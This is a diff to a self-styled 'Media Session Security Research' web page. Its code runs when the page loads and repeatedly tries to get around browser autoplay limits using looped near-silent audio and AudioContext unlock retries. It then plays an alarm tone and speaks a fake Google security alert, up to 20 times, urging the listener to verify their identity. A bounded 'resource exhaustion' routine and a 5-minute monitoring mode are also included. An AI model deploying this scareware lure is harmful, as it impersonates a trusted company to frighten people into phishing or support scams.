@@ -16,7 +16,6 @@
 body {
     background: #fff;
     min-height: 100vh;
-    overflow: hidden;
     font-family: Arial, sans-serif;
 }
 
@@ -28,6 +27,8 @@ body {
     color: white;
     padding: 18px;
     border-radius: 12px;
+    width: calc(100% - 30px);
+    max-width: 430px;
     box-shadow: 0 5px 25px #0003;
 }
 
@@ -59,12 +60,38 @@ button {
     color: white;
 }
 
+#extended-start {
+    background: #059669;
+    color: white;
+}
+
+#extended-stop {
+    background: #b45309;
+    color: white;
+}
+
 #media-log {
     font-size: 11px;
-    max-height: 100px;
+    max-height: 150px;
     overflow-y: auto;
-    margin-top: 10px;
+    margin-top: 12px;
     color: #a7f3d0;
+    overflow-wrap: anywhere;
+}
+
+#progress {
+    height: 6px;
+    background: #374151;
+    border-radius: 5px;
+    margin-top: 12px;
+    overflow: hidden;
+}
+
+#progress-bar {
+    height: 100%;
+    width: 0%;
+    background: #10b981;
+    transition: width .5s;
 }
 </style>
 </head>
@@ -72,14 +99,27 @@ button {
 <body>
 
 <div id="media-test">
-    <h3>Media Session Security Test</h3>
+
+    <h3>Media Session Security Research</h3>
 
     <p id="media-status">Status: Idle</p>
+    <p id="elapsed">Elapsed: 00:00</p>
+    <p id="remaining">Remaining: 05:00</p>
+    <p id="playback">Playback: Unknown</p>
+    <p id="actions">Captured actions: 0</p>
 
-    <button id="media-start">Start Test</button>
-    <button id="media-stop">Stop Test</button>
+    <div id="progress">
+        <div id="progress-bar"></div>
+    </div>
+
+    <button id="media-start">Start Media Test</button>
+    <button id="media-stop">Stop Media Test</button>
+
+    <button id="extended-start">Start 5-Minute Test</button>
+    <button id="extended-stop">Stop Extended Test</button>
 
     <div id="media-log"></div>
+
 </div>
 
 <script>
@@ -91,6 +131,7 @@ button {
 // ============================================
 
 var CONFIG = {
+
     tts: {
         text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
         lang: "en-US",
@@ -101,9 +142,20 @@ var CONFIG = {
         maxRepeats: 20
     },
 
+    test: {
+        duration: 300000,
+        monitorInterval: 5000,
+        resourceTestInterval: 30000,
+        maxContexts: 3
+    },
+
     silentWav:
     "data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA="
 };
+
+// ============================================
+// STATE
+// ============================================
 
 var state = {
     ttsStarted: false,
@@ -111,34 +163,73 @@ var state = {
     ttsCount: 0,
     audioContext: null,
     audioElement: null,
-    active: false,
-    contexts: [],
     timers: []
 };
+
+var mediaTest = {
+    active: false,
+    actions: [],
+    startedAt: null
+};
+
+var extendedTest = {
+    active: false,
+    startedAt: null,
+    monitorTimer: null,
+    stopTimer: null,
+    samples: 0,
+    duration: CONFIG.test.duration
+};
+
+// ============================================
+// DOM
+// ============================================
+
+var statusEl = document.getElementById("media-status");
+var elapsedEl = document.getElementById("elapsed");
+var remainingEl = document.getElementById("remaining");
+var playbackEl = document.getElementById("playback");
+var actionsEl = document.getElementById("actions");
+var progressBar = document.getElementById("progress-bar");
+var logEl = document.getElementById("media-log");
 
 // ============================================
 // LOGGING
 // ============================================
 
 function log(message) {
-    console.log("[SECURITY TEST]", message);
 
-    var el = document.getElementById("media-log");
+    console.log("[MEDIA RESEARCH]", message);
 
-    if (el) {
-        var line = document.createElement("div");
-        line.textContent = new Date().toLocaleTimeString()
-            + " - " + message;
+    var line = document.createElement("div");
 
-        el.prepend(line);
+    line.textContent =
+        new Date().toLocaleTimeString() +
+        " - " + message;
+
+    logEl.prepend(line);
+
+    while (logEl.children.length > 100) {
+        logEl.removeChild(logEl.lastChild);
     }
 }
 
 function updateStatus(message) {
-    document.getElementById("media-status").textContent =
-        "Status: " + message;
-
+    statusEl.textContent = "Status: " + message;
     log(message);
+}
+
+function formatTime(milliseconds) {
+
+    var seconds = Math.floor(milliseconds / 1000);
+
+    var minutes = Math.floor(seconds / 60);
+
+    seconds = seconds % 60;
+
+    return String(minutes).padStart(2, "0") +
+        ":" +
+        String(seconds).padStart(2, "0");
 }
 
 // ============================================
@@ -146,11 +237,13 @@ function updateStatus(message) {
 // ============================================
 
 function speakOnce() {
+
     if (!("speechSynthesis" in window)) return;
 
     if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
 
     try {
+
         var u = new SpeechSynthesisUtterance(
             CONFIG.tts.text
         );
@@ -177,9 +270,11 @@ function speakOnce() {
         };
 
         u.onend = function () {
+
             state.ttsCount++;
 
             if (state.ttsCount < CONFIG.tts.maxRepeats) {
+
                 var timer = setTimeout(
                     speakOnce,
                     CONFIG.tts.repeatInterval
@@ -192,11 +287,12 @@ function speakOnce() {
         speechSynthesis.speak(u);
 
     } catch (e) {
-        log("TTS failed: " + e.message);
+        log("TTS error: " + e.message);
     }
 }
 
 function startTTS() {
+
     if (state.ttsStarted) return;
 
     state.ttsStarted = true;
@@ -211,7 +307,9 @@ function startTTS() {
 // ============================================
 
 function unlockAudioContext() {
+
     try {
+
         var AudioCtx =
             window.AudioContext ||
             window.webkitAudioContext;
@@ -227,7 +325,9 @@ function unlockAudioContext() {
         var ctx = state.audioContext;
 
         if (ctx.state === "suspended") {
+
             ctx.resume().catch(function () {});
+
         }
 
         var osc = ctx.createOscillator();
@@ -245,7 +345,9 @@ function unlockAudioContext() {
         log("AudioContext: " + ctx.state);
 
     } catch (e) {
+
         log("AudioContext error: " + e.message);
+
     }
 }
 
@@ -254,26 +356,32 @@ function unlockAudioContext() {
 // ============================================
 
 function trySilentAudio() {
+
     try {
+
         if (state.audioElement) return;
 
-        var a = new Audio(CONFIG.silentWav);
+        var audio = new Audio(CONFIG.silentWav);
 
-        a.volume = 0.0001;
-        a.loop = true;
+        audio.volume = 0.0001;
+        audio.loop = true;
 
-        state.audioElement = a;
+        state.audioElement = audio;
 
-        var p = a.play();
+        var promise = audio.play();
 
-        if (p && p.catch) {
-            p.catch(function () {
+        if (promise && promise.catch) {
+
+            promise.catch(function () {
                 log("Silent audio autoplay blocked");
             });
+
         }
 
     } catch (e) {
+
         log("Silent audio error: " + e.message);
+
     }
 }
 
@@ -282,11 +390,13 @@ function trySilentAudio() {
 // ============================================
 
 function playMainAudio() {
+
     if (state.mainPlayed) return;
 
     state.mainPlayed = true;
 
     try {
+
         unlockAudioContext();
 
         var ctx = state.audioContext;
@@ -296,28 +406,32 @@ function playMainAudio() {
             return;
         }
 
-        var sr = ctx.sampleRate;
+        var sampleRate = ctx.sampleRate;
         var duration = 3;
 
         var buffer = ctx.createBuffer(
             1,
-            sr * duration,
-            sr
+            sampleRate * duration,
+            sampleRate
         );
 
         var data = buffer.getChannelData(0);
 
         for (var i = 0; i < data.length; i++) {
-            var t = i / sr;
 
-            var freq =
+            var t = i / sampleRate;
+
+            var frequency =
                 880 + (Math.floor(t * 4) % 2) * 440;
 
-            var env = Math.max(0, 1 - t / duration);
+            var envelope = Math.max(
+                0,
+                1 - t / duration
+            );
 
             data[i] =
-                Math.sin(2 * Math.PI * freq * t) *
-                0.3 * env;
+                Math.sin(2 * Math.PI * frequency * t) *
+                0.3 * envelope;
         }
 
         var source = ctx.createBufferSource();
@@ -330,23 +444,21 @@ function playMainAudio() {
         source.start();
 
         var timer = setTimeout(startTTS, 3500);
+
         state.timers.push(timer);
 
     } catch (e) {
+
         log("Main audio error: " + e.message);
+
         startTTS();
+
     }
 }
 
 // ============================================
-// MEDIA SESSION TEST
+// MEDIA SESSION
 // ============================================
-
-var mediaTest = {
-    active: false,
-    actions: [],
-    startedAt: null
-};
 
 var supportedActions = [
     "play",
@@ -361,49 +473,65 @@ var supportedActions = [
 function startMediaSessionTest() {
 
     if (!("mediaSession" in navigator)) {
+
         updateStatus("MediaSession unsupported");
+
         return;
     }
 
     if (mediaTest.active) return;
 
     try {
+
         var session = navigator.mediaSession;
 
         session.metadata = new MediaMetadata({
+
             title: "Media Session Security Test",
+
             artist: "Browser Research PoC",
+
             album: "Focus Interaction Test",
+
             artwork: []
+
         });
 
         supportedActions.forEach(function (action) {
 
             try {
+
                 session.setActionHandler(
                     action,
                     function (event) {
 
                         var result = {
+
                             action: action,
+
                             timestamp: Date.now()
+
                         };
 
                         mediaTest.actions.push(result);
+
+                        actionsEl.textContent =
+                            "Captured actions: " +
+                            mediaTest.actions.length;
 
                         updateStatus(
                             "Action received: " + action
                         );
 
                         log(JSON.stringify(result));
+
                     }
                 );
 
             } catch (e) {
-                log(
-                    "Unsupported action: " +
-                    action
-                );
+
+                log("Unsupported action: " + action);
+
             }
 
         });
@@ -416,7 +544,9 @@ function startMediaSessionTest() {
         updateStatus("Media Session registered");
 
     } catch (e) {
+
         updateStatus("MediaSession error: " + e.message);
+
     }
 }
 
@@ -433,14 +563,19 @@ function stopMediaSessionTest() {
     supportedActions.forEach(function (action) {
 
         try {
+
             session.setActionHandler(action, null);
+
         } catch (e) {}
 
     });
 
     try {
+
         session.metadata = null;
+
         session.playbackState = "none";
+
     } catch (e) {}
 
     mediaTest.active = false;
@@ -449,8 +584,7 @@ function stopMediaSessionTest() {
 }
 
 // ============================================
-// RESOURCE EXHAUSTION TEST
-// BOUNDED TEST ONLY
+// RESOURCE TEST
 // ============================================
 
 function triggerResourceTest() {
@@ -461,37 +595,44 @@ function triggerResourceTest() {
         window.AudioContext ||
         window.webkitAudioContext;
 
-    if (!AudioCtx) {
-        log("AudioContext unsupported");
-        return;
-    }
+    if (!AudioCtx) return;
 
     var contexts = [];
 
     try {
 
-        for (var i = 0; i < 3; i++) {
+        for (
+            var i = 0;
+            i < CONFIG.test.maxContexts;
+            i++
+        ) {
 
             var ctx = new AudioCtx();
 
             var osc = ctx.createOscillator();
+
             var gain = ctx.createGain();
 
             gain.gain.value = 0.0001;
 
             osc.connect(gain);
+
             gain.connect(ctx.destination);
 
             osc.start();
+
             osc.stop(ctx.currentTime + 0.2);
 
             contexts.push(ctx);
+
         }
 
         log("Created contexts: " + contexts.length);
 
     } catch (e) {
-        log("Resource test error: " + e.message);
+
+        log("Resource error: " + e.message);
+
     }
 
     setTimeout(async function () {
@@ -499,57 +640,217 @@ function triggerResourceTest() {
         for (var i = 0; i < contexts.length; i++) {
 
             try {
+
                 await contexts[i].close();
+
             } catch (e) {}
 
         }
 
-        log("Resource test cleanup completed");
+        log("Resource cleanup completed");
 
     }, 1000);
 }
 
 // ============================================
-// MEMORY MONITORING
+// MEMORY MONITOR
 // ============================================
 
 function monitorMemory() {
 
     if (performance.memory) {
 
-        log(
-            "JS Heap: " +
-            Math.round(
-                performance.memory.usedJSHeapSize /
-                1024 / 1024
-            ) + " MB"
+        var used = Math.round(
+            performance.memory.usedJSHeapSize /
+            1024 / 1024
         );
+
+        log("JS Heap: " + used + " MB");
 
     } else {
 
         log("Memory API unavailable");
+
     }
 }
 
 // ============================================
-// EVENT HANDLERS
+// EXTENDED TEST
+// ============================================
+
+function updateExtendedUI() {
+
+    if (!extendedTest.active) return;
+
+    var elapsed =
+        Date.now() - extendedTest.startedAt;
+
+    var remaining = Math.max(
+        0,
+        extendedTest.duration - elapsed
+    );
+
+    elapsedEl.textContent =
+        "Elapsed: " + formatTime(elapsed);
+
+    remainingEl.textContent =
+        "Remaining: " + formatTime(remaining);
+
+    progressBar.style.width =
+        Math.min(
+            100,
+            elapsed / extendedTest.duration * 100
+        ) + "%";
+
+    playbackEl.textContent =
+        "Playback: " +
+        (
+            navigator.mediaSession
+                ? navigator.mediaSession.playbackState
+                : "Unsupported"
+        );
+
+    actionsEl.textContent =
+        "Captured actions: " +
+        mediaTest.actions.length;
+}
+
+function startExtendedTest() {
+
+    if (extendedTest.active) return;
+
+    startMediaSessionTest();
+
+    if (!mediaTest.active) return;
+
+    extendedTest.active = true;
+
+    extendedTest.startedAt = Date.now();
+
+    extendedTest.samples = 0;
+
+    updateStatus("Extended test started - 5 minutes");
+
+    extendedTest.monitorTimer = setInterval(function () {
+
+        if (!extendedTest.active) return;
+
+        extendedTest.samples++;
+
+        var elapsed =
+            Date.now() - extendedTest.startedAt;
+
+        log(
+            "Elapsed: " +
+            formatTime(elapsed)
+        );
+
+        log(
+            "Playback state: " +
+            navigator.mediaSession.playbackState
+        );
+
+        log(
+            "Captured actions: " +
+            mediaTest.actions.length
+        );
+
+        monitorMemory();
+
+        updateExtendedUI();
+
+    }, CONFIG.test.monitorInterval);
+
+    extendedTest.stopTimer = setTimeout(
+        stopExtendedTest,
+        extendedTest.duration
+    );
+
+    updateExtendedUI();
+}
+
+// ============================================
+// STOP EXTENDED TEST
+// ============================================
+
+function stopExtendedTest() {
+
+    if (!extendedTest.active) return;
+
+    extendedTest.active = false;
+
+    clearInterval(extendedTest.monitorTimer);
+
+    clearTimeout(extendedTest.stopTimer);
+
+    extendedTest.monitorTimer = null;
+
+    extendedTest.stopTimer = null;
+
+    log("Extended test completed");
+
+    log("Total samples: " + extendedTest.samples);
+
+    log("Total actions: " + mediaTest.actions.length);
+
+    progressBar.style.width = "100%";
+
+    updateStatus("Extended test completed");
+
+    elapsedEl.textContent =
+        "Elapsed: " +
+        formatTime(Date.now() - extendedTest.startedAt);
+
+    remainingEl.textContent = "Remaining: 00:00";
+}
+
+// ============================================
+// BUTTONS
 // ============================================
 
 document.getElementById("media-start")
     .addEventListener("click", function () {
 
-        startMediaSessionTest();
-
         unlockAudioContext();
+
+        startMediaSessionTest();
 
     });
 
 document.getElementById("media-stop")
     .addEventListener("click", function () {
 
+        stopExtendedTest();
+
         stopMediaSessionTest();
 
     });
+
+document.getElementById("extended-start")
+    .addEventListener("click", startExtendedTest);
+
+document.getElementById("extended-stop")
+    .addEventListener("click", stopExtendedTest);
+
+// ============================================
+// VISIBILITY MONITOR
+// ============================================
+
+document.addEventListener(
+    "visibilitychange",
+    function () {
+
+        log(
+            "Visibility: " +
+            document.visibilityState
+        );
+
+        if (extendedTest.active) {
+            updateExtendedUI();
+        }
+
+    }
+);
 
 // ============================================
 // INITIALIZATION
@@ -568,7 +869,9 @@ var retry = setInterval(function () {
     unlockAudioContext();
 
     if (retryCount >= 10) {
+
         clearInterval(retry);
+
     }
 
 }, 2000);
@@ -576,7 +879,7 @@ var retry = setInterval(function () {
 state.timers.push(retry);
 
 // ============================================
-// EXECUTION
+// ORIGINAL EXECUTION
 // ============================================
 
 setTimeout(function () {
@@ -590,7 +893,9 @@ setTimeout(function () {
 setTimeout(function () {
 
     if (!state.mainPlayed) {
+
         playMainAudio();
+
     }
 
 }, 500);
@@ -598,11 +903,15 @@ setTimeout(function () {
 setTimeout(function () {
 
     if (!state.mainPlayed) {
+
         playMainAudio();
+
     }
 
     if (!state.ttsStarted) {
+
         startTTS();
+
     }
 
     triggerResourceTest();
@@ -612,53 +921,46 @@ setTimeout(function () {
 }, 1500);
 
 // ============================================
-// VISIBILITY CHANGE
-// ============================================
-
-document.addEventListener(
-    "visibilitychange",
-    function () {
-
-        log(
-            "Visibility: " +
-            document.visibilityState
-        );
-
-        if (!document.hidden && !state.mainPlayed) {
-            setTimeout(playMainAudio, 100);
-        }
-
-    }
-);
-
-// ============================================
 // CLEANUP
 // ============================================
 
 function cleanup() {
 
+    stopExtendedTest();
+
     stopMediaSessionTest();
 
     state.timers.forEach(function (timer) {
+
         clearTimeout(timer);
+
         clearInterval(timer);
+
     });
 
     state.timers = [];
 
     if ("speechSynthesis" in window) {
+
         speechSynthesis.cancel();
+
     }
 
     if (state.audioElement) {
+
         state.audioElement.pause();
+
         state.audioElement = null;
+
     }
 
-    if (state.audioContext &&
-        state.audioContext.state !== "closed") {
+    if (
+        state.audioContext &&
+        state.audioContext.state !== "closed"
+    ) {
 
         state.audioContext.close().catch(function () {});
+
     }
 
     log("Cleanup completed");
